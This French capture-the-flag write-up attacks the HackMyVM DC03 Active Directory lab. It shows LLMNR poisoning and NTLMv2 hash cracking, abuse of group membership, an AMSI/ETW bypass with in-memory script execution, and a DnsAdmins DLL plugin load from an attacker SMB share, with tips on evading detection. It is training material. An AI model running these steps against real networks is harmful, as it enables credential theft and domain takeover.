---
title: "Solution du CTF DC02 de HackMyVM.eu"
tags: [CTF,HackMyVM,Windows]
---

### Hash in a bottle

On est parti pour le DC03, étant donné que les deux précédents étaient très bon. Celui-là m'a donné du fil à retordre à cause d'un bug stupide de la VM mais ça m'a permit de découvrir et de tenter quelques attaques.

```console
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-19 00:18:22Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:4F:0C:26 (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
```

Pour faire ce CTF de façon plus consciencieuse, on peut par exemple retrouver notre situation dans la [MindMap Windows AD de Orange-CyberDefense](https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg).

Par exemple vu que l'on a rien du tout pour commencer, on peut utiliser Kerbrute comme on l'a fait sur les précédents opus.

```console
$ ./kerbrute userenum -d soupedecode.local --dc 192.168.56.126 /opt/SecLists/Usernames/Names/names.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/18/25 - Ronnie Flathers @ropnop

2025/06/18 17:20:03 >  Using KDC(s):
2025/06/18 17:20:03 >   192.168.56.126:88

2025/06/18 17:20:04 >  [+] VALID USERNAME:       charlie@soupedecode.local
2025/06/18 17:20:04 >  Done! Tested 10177 usernames (1 valid) in 0.897 seconds
```

Mais comme cette fois, on ne parvient pas à trouver le mot de passe de `charlie` on va sortir un autre outil :

```console
# python Responder.py -I vboxnet0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

[*] Sponsor Responder: https://paypal.me/PythonResponder

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
--- snip ---
[+] Listening for events...

[!] Error starting TCP server on port 21, check permissions or other servers running.
[!] Error starting TCP server on port 53, check permissions or other servers running.
[*] [MDNS] Poisoned answer sent to 192.168.56.126  for name FileServer.local
[*] [NBT-NS] Poisoned answer sent to 192.168.56.126 for name FILESERVER (service: File Server)
[*] [LLMNR]  Poisoned answer sent to fe80::5b4:a375:14eb:da4b for name FileServer
[*] [MDNS] Poisoned answer sent to fe80::5b4:a375:14eb:da4b for name FileServer.local
[*] [MDNS] Poisoned answer sent to 192.168.56.126  for name FileServer.local
[*] [MDNS] Poisoned answer sent to fe80::5b4:a375:14eb:da4b for name FileServer.local
[*] [LLMNR]  Poisoned answer sent to fe80::5b4:a375:14eb:da4b for name FileServer
[*] [LLMNR]  Poisoned answer sent to 192.168.56.126 for name FileServer
[*] [LLMNR]  Poisoned answer sent to 192.168.56.126 for name FileServer
[SMB] NTLMv2-SSP Client   : fe80::5b4:a375:14eb:da4b
[SMB] NTLMv2-SSP Username : soupedecode\xkate578
[SMB] NTLMv2-SSP Hash     : xkate578::soupedecode:2789ebcb50e55063:793877812B7C0C3476BF9D8A9AADC084:010100000000000080043B5677E0DB011BFEF09EA603B98A000000000200080031004C0048004C0001001E00570049004E002D0035003700300031004B004C003100560051004B00360004003400570049004E002D0035003700300031004B004C003100560051004B0036002E0031004C0048004C002E004C004F00430041004C000300140031004C0048004C002E004C004F00430041004C000500140031004C0048004C002E004C004F00430041004C000700080080043B5677E0DB01060004000200000008003000300000000000000000000000004000000E55D0B699C33A3824DF74CC610EBAC5A581841F0CBF1FDB0C42818D3CBF114E0A0010000000000000000000000000000000000009001E0063006900660073002F00460069006C0065005300650072007600650072000000000000000000
```

Juste avec du LLMNR poisoning, nous avons déjà le hash de l'utilisateur `xkate578` qui est cassable :

```console
root@4ba639addc13:~# hashcat -m 5600 /data/hash.txt /data/rockyou.txt 
hashcat (v6.2.6-851-g6716447df) starting

OpenCL API (OpenCL 3.0 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: 13th Gen Intel(R) Core(TM) i7-1360P, 15820/31705 MB (7926 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 4 MB

Dictionary cache built:
* Filename..: /data/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

XKATE578::soupedecode:2789ebcb50e55063:793877812b7c0c3476bf9d8a9aadc084:010100000000000080043b5677e0db011bfef09ea603b98a000000000200080031004c0048004c0001001e00570049004e002d0035003700300031004b004c003100560051004b00360004003400570049004e002d0035003700300031004b004c003100560051004b0036002e0031004c0048004c002e004c004f00430041004c000300140031004c0048004c002e004c004f00430041004c000500140031004c0048004c002e004c004f00430041004c000700080080043b5677e0db01060004000200000008003000300000000000000000000000004000000e55d0b699c33a3824df74cc610ebac5a581841f0cbf1fdb0c42818d3cbf114e0a0010000000000000000000000000000000000009001e0063006900660073002f00460069006c0065005300650072007600650072000000000000000000:jesuschrist

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: XKATE578::soupedecode:2789ebcb50e55063:793877812b7c...000000
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/data/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  5120.6 kH/s (2.66ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 16384/14344384 (0.11%)
Rejected.........: 0/16384 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> christal
Hardware.Mon.#1..: Temp: 71c Util: 22%
```

Le password est `jesuschrist`. Avec le compte, on peut lister les partages :

```console
$ ./nxc smb 192.168.56.126 -u xkate578 -p jesuschrist --shares
SMB         192.168.56.126  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
SMB         192.168.56.126  445    DC01             [+] SOUPEDECODE.LOCAL\xkate578:jesuschrist 
SMB         192.168.56.126  445    DC01             [*] Enumerated shares
SMB         192.168.56.126  445    DC01             Share           Permissions     Remark
SMB         192.168.56.126  445    DC01             -----           -----------     ------
SMB         192.168.56.126  445    DC01             ADMIN$                          Remote Admin
SMB         192.168.56.126  445    DC01             C$                              Default share
SMB         192.168.56.126  445    DC01             IPC$            READ            Remote IPC
SMB         192.168.56.126  445    DC01             NETLOGON        READ            Logon server share 
SMB         192.168.56.126  445    DC01             share           READ,WRITE      
SMB         192.168.56.126  445    DC01             SYSVOL          READ            Logon server share
```

Ou encore extraire la liste des utilisateurs de l'AD :

```console
$ ./nxc smb 192.168.56.126 -u xkate578 -p jesuschrist --users-export list.txt
SMB         192.168.56.126  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) 
SMB         192.168.56.126  445    DC01             [+] SOUPEDECODE.LOCAL\xkate578:jesuschrist 
SMB         192.168.56.126  445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         192.168.56.126  445    DC01             Administrator                 2024-08-01 06:08:58 0       Built-in account for administering the computer/domain 
SMB         192.168.56.126  445    DC01             Guest                         <never>             1       Built-in account for guest access to the computer/domain 
SMB         192.168.56.126  445    DC01             krbtgt                        2024-06-15 19:25:27 0       Key Distribution Center Service Account 
SMB         192.168.56.126  445    DC01             bmark0                        2024-06-15 20:04:35 0       Chess player and puzzle solver 
SMB         192.168.56.126  445    DC01             otara1                        2024-06-15 20:04:35 0       Nature lover and hiking enthusiast 
SMB         192.168.56.126  445    DC01             kleo2                         2024-06-15 20:04:35 0       Adventure seeker and extreme sports fan 
SMB         192.168.56.126  445    DC01             eyara3                        2024-06-15 20:04:35 0       Bird watcher and wildlife photographer 
SMB         192.168.56.126  445    DC01             pquinn4                       2024-06-15 20:04:35 0       Music lover and aspiring guitarist
--- snip ---
```

Et enfin obtenir le premier flag :

```console
$ smbclient -U xkate578 //192.168.56.126/share
Password for [WORKGROUP\xkate578]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Thu Jun 19 02:41:34 2025
  ..                                  D        0  Thu Aug  1 07:38:08 2024
  desktop.ini                       AHS      282  Thu Aug  1 07:38:08 2024
  user.txt                            A       70  Thu Aug  1 07:39:25 2024

                12942591 blocks of size 4096. 10804519 blocks available
smb: \> get user.txt
getting file \user.txt of size 70 as user.txt (3,3 KiloBytes/sec) (average 3,3 KiloBytes/sec)
```

Le flag est `12f54a96f64443246930da001cafda8b`.

### Conseiller d'orientation

Malgré ça, le compte ne permet aucun accès à une ligne de commande. On va donc chercher ailleurs.

J'ai tenté la voie des certificats (ADCS) mais sans succès :

```console
$ certipy find -u xkate578@SOUPEDECODE.LOCAL -p jesuschrist -dc-ip 192.168.56.126 -ldap-scheme ldap -ldap-port 389
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 0 certificate templates
[*] Finding certificate authorities
[*] Found 0 certificate authorities
[*] Found 0 enabled certificate templates
[*] Finding issuance policies
[*] Found 1 issuance policy
[*] Found 0 OIDs linked to templates
[*] Saving text output to '20250618180756_Certipy.txt'
[*] Wrote text output to '20250618180756_Certipy.txt'
[*] Saving JSON output to '20250618180756_Certipy.json'
[*] Wrote JSON output to '20250618180756_Certipy.json'
```

Je me suis tourné vers le plus classique BloodHound pour cartographier les utilisateurs, groupes et permissions de l'active directory.

Il faut d'abord collecter les données, ici avec bloodhound-python :

```console
$ bloodhound-python -ns 192.168.56.126 --dns-tcp --dns-timeout 60 -d SOUPEDECODE.LOCAL -u xkate578 -p jesuschrist -dc dc01.SOUPEDECODE.LOCAL
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
Traceback (most recent call last):
  File "/tmp/myvenv/bin/bloodhound-python", line 8, in <module>
    sys.exit(main())
             ^^^^^^
  File "/tmp/myvenv/lib/python3.12/site-packages/bloodhound/__init__.py", line 314, in main
    ad.dns_resolve(domain=args.domain, options=args)
  File "/tmp/myvenv/lib/python3.12/site-packages/bloodhound/ad/domain.py", line 705, in dns_resolve
    q = self.dnsresolver.query(query, 'SRV', tcp=self.dns_tcp)
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/tmp/myvenv/lib/python3.12/site-packages/dns/resolver.py", line 1363, in query
    return self.resolve(
           ^^^^^^^^^^^^^
  File "/tmp/myvenv/lib/python3.12/site-packages/dns/resolver.py", line 1317, in resolve
    (nameserver, tcp, backoff) = resolution.next_nameserver()
                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/tmp/myvenv/lib/python3.12/site-packages/dns/resolver.py", line 764, in next_nameserver
    raise NoNameservers(request=self.request, errors=self.errors)
dns.resolver.NoNameservers: All nameservers failed to answer the query _ldap._tcp.pdc._msdcs.SOUPEDECODE.LOCAL. IN SRV: Server Do53:192.168.56.126@53 answered SERVFAIL
```

Oops. On dirait bien qu'il manque un enregistrement DNS ou quelque chose dans le genre...

Finalement, j'ai trouvé cet article qui explique comment on peut s'en tirer avec le DNS menteur DNSChef :

[Comment utiliser DNSChef pour résoudre les problèmes de connectivité de Bloodhound liés aux timeouts LDAP &middot; Un blog sur mes projets](https://blog.ar-lacroix.fr/fr/posts/2025-7-dnschef-fix-bloodhound-connectivity-issues-over-proxies/)

J'ai mis en place ce fichier de config :

```ini
[A]
dc01.soupedecode.local=192.168.56.126

[SRV]
; FORMAT : priorité poids port cible
*.*.*.*.soupedecode.local=0 5 5060 dc01.soupedecode.local
```

Puis lancé dnschef :

```console
# python dnschef.py --file dnschef.ini 
          _                _          __  
         | | version 0.4  | |        / _| 
       __| |_ __  ___  ___| |__   ___| |_ 
      / _` | '_ \/ __|/ __| '_ \ / _ \  _|
     | (_| | | | \__ \ (__| | | |  __/ |  
      \__,_|_| |_|___/\___|_| |_|\___|_|  
                   iphelix@thesprawl.org  

(10:17:37) [*] DNSChef started on interface: 127.0.0.1
(10:17:37) [*] Using the following nameservers: 8.8.8.8
(10:17:37) [*] Cooking A replies for domain dc01.soupedecode.local with '192.168.56.126'
(10:17:37) [*] Cooking SRV replies for domain *.*.*.*.soupedecode.local with '0 5 5060 dc01.soupedecode.local'
```

Je relance alors la connexion en spécifiant mon DNS local et ça marche :

```console
$ bloodhound-python -ns 127.0.0.1 -d SOUPEDECODE.LOCAL -u xkate578 -p jesuschrist -dc dc01.SOUPEDECODE.LOCAL -c All
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: soupedecode.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.SOUPEDECODE.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 101 computers
INFO: Found 964 users
INFO: Connecting to LDAP server: dc01.SOUPEDECODE.LOCAL
INFO: Found 53 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: 
--- snip ---
INFO: Querying computer: 
INFO: Querying computer: DC01.SOUPEDECODE.LOCAL
INFO: Done in 00M 00S
```

Au début je pensais utiliser BloodHound depuis Kali mais il n'est pas installé par défaut.

Finalement j'ai choisis de passer par le docker-compose offciel. La mise en place est plutôt simple : récupérer deux fichier et lancer les containers.

```bash
mkdir bloodhound
cd bloodhound/
wget https://raw.githubusercontent.com/SpecterOps/BloodHound/refs/heads/main/examples/docker-compose/bloodhound.config.json
wget https://raw.githubusercontent.com/SpecterOps/BloodHound/refs/heads/main/examples/docker-compose/docker-compose.yml
docker compose up -d
```

Le mot de passe initial doit être récupéré dans les logs du container principal :

```bash
docker logs bloodhound-bloodhound-1 | grep "Initial Password"
```

Il faut alors se rendre sur `http://localhost:8080/ui/login` avec le nom d'utilisateur `spam@example.com` et le mot de passe récupéré.

Sur ce [BloodHound Cypher Cheatsheet](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/), on trouve différentes requêtes Cypher comme **Show all high value target group** :

```
MATCH p=(n:User)-[r:MemberOf*1..]->(m:Group {highvalue:true}) RETURN p
```

Ça m'a retourné ce graphe qui est sans doute le plus intéressant :

![BloodHound DC03 HackMyVM](/assets/img/hackmyvm/dc03_bloodhound.png)  

Le compte `fbeth103` semble être une victime toute désignée.

Notre utilisateur courant `xkate578` fait partie du groupe `ACCOUNT OPERATORS` dont les membres sont habilités à rajouter des utilisateurs à des groupes ou changer des mots de passe.

Seulement d'après la documentation que j'ai pu trouver, cela exclut normalement les groupes de haut niveau et d'ailleurs quand je tente de changer le mot de passe de `fbeth103` ça échoue.

```console
$ net rpc password fbeth103 -U SOUPEDECODE.LOCAL/xkate578%jesuschrist -S 192.168.56.126
Enter new password for fbeth103:
Failed to set password for 'fbeth103' with error: Access is denied..
```

On verra plus tard que c'était lié à un bug inconnu.

Quand on regarde `xkate578` dans Bloodhound, on voit plus de 1000 règles "Outbound Object Control". Toutes proviennent de son adhésion au groupe `ACCOUNT OPERATORS`.

Ce groupe a de nombreux liens `GenericAll`. J'ai utilisé cette requête pour ne garder que les groupes :

```
MATCH (ao:Group {name: 'ACCOUNT OPERATORS@SOUPEDECODE.LOCAL'})
MATCH (g:Group)
MATCH p=(ao)-[:GenericAll]->(g)
RETURN p
```

Le résultat :

```
ACCESS CONTROL ASSISTANCE OPERATORS@SOUPEDECODE.LOCAL
ACCOUNT OPERATORS@SOUPEDECODE.LOCAL
ALLOWED RODC PASSWORD REPLICATION GROUP@SOUPEDECODE.LOCAL
CERTIFICATE SERVICE DCOM ACCESS@SOUPEDECODE.LOCAL
CERT PUBLISHERS@SOUPEDECODE.LOCAL
CLONEABLE DOMAIN CONTROLLERS@SOUPEDECODE.LOCAL
CRYPTOGRAPHIC OPERATORS@SOUPEDECODE.LOCAL
DENIED RODC PASSWORD REPLICATION GROUP@SOUPEDECODE.LOCAL
DISTRIBUTED COM USERS@SOUPEDECODE.LOCAL
DNSADMINS@SOUPEDECODE.LOCAL
DNSUPDATEPROXY@SOUPEDECODE.LOCAL
DOMAIN COMPUTERS@SOUPEDECODE.LOCAL
DOMAIN GUESTS@SOUPEDECODE.LOCAL
DOMAIN USERS@SOUPEDECODE.LOCAL
ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@SOUPEDECODE.LOCAL
EVENT LOG READERS@SOUPEDECODE.LOCAL
GROUP POLICY CREATOR OWNERS@SOUPEDECODE.LOCAL
GUESTS@SOUPEDECODE.LOCAL
HYPER-V ADMINISTRATORS@SOUPEDECODE.LOCAL
IIS_IUSRS@SOUPEDECODE.LOCAL
INCOMING FOREST TRUST BUILDERS@SOUPEDECODE.LOCAL
NETWORK CONFIGURATION OPERATORS@SOUPEDECODE.LOCAL
PERFORMANCE LOG USERS@SOUPEDECODE.LOCAL
PERFORMANCE MONITOR USERS@SOUPEDECODE.LOCAL
PRE-WINDOWS 2000 COMPATIBLE ACCESS@SOUPEDECODE.LOCAL
PROTECTED USERS@SOUPEDECODE.LOCAL
RAS AND IAS SERVERS@SOUPEDECODE.LOCAL
RDS ENDPOINT SERVERS@SOUPEDECODE.LOCAL
RDS MANAGEMENT SERVERS@SOUPEDECODE.LOCAL
RDS REMOTE ACCESS SERVERS@SOUPEDECODE.LOCAL
REMOTE DESKTOP USERS@SOUPEDECODE.LOCAL
REMOTE MANAGEMENT USERS@SOUPEDECODE.LOCAL
STORAGE REPLICA ADMINISTRATORS@SOUPEDECODE.LOCAL
TERMINAL SERVER LICENSE SERVERS@SOUPEDECODE.LOCAL
USERS@SOUPEDECODE.LOCAL
WINDOWS AUTHORIZATION ACCESS GROUP@SOUPEDECODE.LOCAL
```

Il y a pas mal de groupes intéressants. D'abord, je me rajoute au groupe "remote management" afin d'accéder à WinRM :

```console
$ net rpc group ADDMEM "REMOTE MANAGEMENT USERS" xkate578 -U soupedecode.local/xkate578  -S 192.168.56.126
Password for [SOUPEDECODE.LOCAL\xkate578]:
$ net rpc group members "REMOTE MANAGEMENT USERS" -U soupedecode.local/xkate578  -S 192.168.56.126
Password for [SOUPEDECODE.LOCAL\xkate578]:
SOUPEDECODE\xkate578
```

Et ça marche :

```console
$ ./nxc winrm 192.168.56.126 -u xkate578 -p jesuschrist -X whoami
WINRM       192.168.56.126  5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:SOUPEDECODE.LOCAL)
WINRM       192.168.56.126  5985   DC01             [+] SOUPEDECODE.LOCAL\xkate578:jesuschrist (Pwn3d!)
WINRM       192.168.56.126  5985   DC01             [+] Executed command (shell type: powershell)
WINRM       192.168.56.126  5985   DC01             soupedecode\xkate578
```

De là, j'ai obtenu le premier flag :

```console
$ docker run --rm -ti --name evil-winrm3 -v /tmp/:/data oscarakaelvis/evil-winrm -i 192.168.56.126 -u xkate578 -p jesuschrist

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\xkate578\Documents> dir
*Evil-WinRM* PS C:\Users\xkate578\Documents> cd ..
*Evil-WinRM* PS C:\Users\xkate578> cd desktop
*Evil-WinRM* PS C:\Users\xkate578\desktop> dir


    Directory: C:\Users\xkate578\desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         7/31/2024  10:39 PM             70 user.txt


*Evil-WinRM* PS C:\Users\xkate578\desktop> type user.txt
12f54a96f64443246930da001cafda8b
```

### At least you tried

Profitant de ce shell j'ai exécuté un WinPEAS powershell après avoir bypassé l'AMSI :

```console
*Evil-WinRM* PS C:\users\xkate578\Documents> upload wp_b64.ps1

Warning: Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command

Info: Uploading /data/wp_b64.ps1 to C:\users\xkate578\Documents\wp_b64.ps1

Data: 145960 bytes of 145960 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\users\xkate578\Documents> menu


   ,.   (   .      )               "            ,.   (   .      )       .   
  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers

[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit

*Evil-WinRM* PS C:\users\xkate578\Documents> Bypass-4MSI

Info: Patching 4MSI, please be patient...

[+] Success!

Info: Patching ETW, please be patient ..

[+] Success!
*Evil-WinRM* PS C:\users\xkate578\Documents> $b64_content = Get-Content -Path "C:/users/xkate578/Documents/wp_b64.ps1" -Raw; [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64_content)) | IEX
```

Comme à son habitude, il a merdé au moment d'énumérer la base de registre. Dans tous les cas, rien d'intéressant.

Je suis retourné à mes ajouts de groupes en me dirigeant d'abord vers `CERTIFICATE SERVICE DCOM ACCESS` en me disant que peut être `certipy` trouverais plus de choses :

```bash
net rpc group ADDMEM "CERTIFICATE SERVICE DCOM ACCESS" xkate578 -U soupedecode.local/xkate578  -S 192.168.56.126
```

```console
$ certipy find -u xkate578@soupedecode.local -p jesuschrist -dc-ip 192.168.56.126 -ldap-scheme ldap -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 0 certificate templates
[*] Finding certificate authorities
[*] Found 0 certificate authorities
[*] Found 0 enabled certificate templates
[*] Finding issuance policies
[*] Found 1 issuance policy
[*] Found 0 OIDs linked to templates
[*] Enumeration output:
Certificate Authorities                 : [!] Could not find any CAs
Certificate Templates                   : [!] Could not find any certificate templates
```

Encore raté !

J'ai exploré un peu la piste du groupe `ALLOWED RODC PASSWORD REPLICATION` mais d'après l'article [Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory](https://adsecurity.org/?p=3592), il faut que des membres soit déjà dedans pour que l'attaque fonctionne.

Finalement la piste de `DNSADMINS` me semblait la plus prometteuse. Le principe, c'est que la commande `dnscmd` permet de charger une DLL qui sera exécuté avec le compte SYSTEM.

Seuls les membres de `DNSADMINS` peuvent exécuter la commande en question. Ainsi si je l'exécute :

```console
*Evil-WinRM* PS C:\Users\xkate578> dnscmd /info

Info query failed
    status = 5 (0x00000005)

Command failed:  ERROR_ACCESS_DENIED     5    0x5
```

Et si je me rajoute au groupe :

```bash
net rpc group ADDMEM "DNSADMINS" xkate578 -U soupedecode.local/xkate578  -S 192.168.56.126
```

Et que j'ouvre une nouvelle session WinRM :

```console
*Evil-WinRM* PS C:\Users\xkate578\Documents> dnscmd /info

Query result:

Server info
        server name              = DC01.SOUPEDECODE.LOCAL
        version                  = 4F7C000A (10.0 build 20348)
        DS container             = cn=MicrosoftDNS,cn=System,DC=SOUPEDECODE,DC=LOCAL
        forest name              = SOUPEDECODE.LOCAL
        domain name              = SOUPEDECODE.LOCAL
        builtin forest partition = ForestDnsZones.SOUPEDECODE.LOCAL
        builtin domain partition = DomainDnsZones.SOUPEDECODE.LOCAL
        read only DC             = 0
        last scavenge cycle      = not since restart (0)
  Configuration:
        dwLogLevel               = 00000000
        dwDebugLevel             = 00000000
        dwRpcProtocol            = 00000005
        dwNameCheckFlag          = 00000002
        cAddressAnswerLimit      = 0
        dwRecursionRetry         = 3
        dwRecursionTimeout       = 8
        dwDsPollingInterval      = 180
  Configuration Flags:
        fBootMethod                  = 3
        fAdminConfigured             = 0
        fAllowUpdate                 = 1
        fDsAvailable                 = 1
        fAutoReverseZones            = 1
        fAutoCacheUpdate             = 0
        fSlave                       = 0
        fNoRecursion                 = 0
        fRoundRobin                  = 1
        fStrictFileParsing           = 0
        fLooseWildcarding            = 0
        fBindSecondaries             = 0
        fWriteAuthorityNs            = 0
        fLocalNetPriority            = 1
  Aging Configuration:
        ScavengingInterval           = 0
        DefaultAgingState            = 0
        DefaultRefreshInterval       = 168
        DefaultNoRefreshInterval     = 168
  ServerAddresses:

        Ptr          = 000001B7FFC7BFE0
        MaxCount     = 2
        AddrCount    = 2
                Addr[0] => af=23, salen=28, [sub=0, flag=00000000] p=13568, addr=fe80::5b4:a375:14eb:da4b
                Addr[1] => af=2, salen=16, [sub=0, flag=00000000] p=13568, addr=192.168.56.126

  ListenAddresses:
        NULL IP Array.
  Forwarders:
        NULL IP Array.
        forward timeout  = 3
        slave            = 0
Command completed successfully.
```

Je vous passe la création d'une DLL Windows cross compilée depuis Linux. Il faut savoir que pour que ça fonctionne, la librairie doit exporter un nom de fonction bien spécifique.

Pour éviter de se faire détecter, on privilégiera du code custom plutôt que du `msfvenom`. Au choix du simple C, Go ou Rust. J'avais choisi ce dernier :

```bash
docker run --rm -v "$(pwd):/app" rust:latest     bash -c " \
    apt-get update && apt-get install -y mingw-w64 && \
    cd /app && \
    rustup target add x86_64-pc-windows-gnu && \
    cargo build --release --target x86_64-pc-windows-gnu \
    "
```

Mais j'ai été bien déçu au moment de l'exploitation :

```console
*Evil-WinRM* PS C:\Users\xkate578\Documents> dnscmd dc01.soupedecode.local /config /serverlevelplugindll \\192.168.56.1\share\test.dll

DNS Server failed to reset registry property.
    Status = 5 (0x00000005)
Command failed:  ERROR_ACCESS_DENIED     5    0x5
```

Il est clairement question de la base de registre. Je regarde les ACL sur l'emplacement de la clé normalement utilisé par `dnscmd` :

```console
*Evil-WinRM* PS C:\Users\xkate578\Documents> $acl = Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\DNS
*Evil-WinRM* PS C:\Users\xkate578\Documents> $acl.Access | ForEach-Object {
    [PSCustomObject]@{
        IdentityReference = $_.IdentityReference
        AccessControlType = $_.AccessControlType
        IsInherited = $_.IsInherited
        PropagationFlags = $_.PropagationFlags
        RegistryRights = $_.RegistryRights # This is the key change!
    }
} | Format-Table -AutoSize

IdentityReference                                                                                    AccessControlType IsInherited PropagationFlags                          RegistryRights
-----------------                                                                                    ----------------- ----------- ----------------                          --------------
NT AUTHORITY\Authenticated Users                                                                                 Allow        True             None                                 ReadKey
NT AUTHORITY\Authenticated Users                                                                                 Allow        True      InheritOnly                             -2147483648
BUILTIN\Server Operators                                                                                         Allow        True             None SetValue, CreateSubKey, Delete, ReadKey
BUILTIN\Server Operators                                                                                         Allow        True      InheritOnly                             -1073676288
BUILTIN\Administrators                                                                                           Allow        True             None                             FullControl
BUILTIN\Administrators                                                                                           Allow        True      InheritOnly                               268435456
NT AUTHORITY\SYSTEM                                                                                              Allow        True             None                             FullControl
NT AUTHORITY\SYSTEM                                                                                              Allow        True      InheritOnly                               268435456
CREATOR OWNER                                                                                                    Allow        True      InheritOnly                               268435456
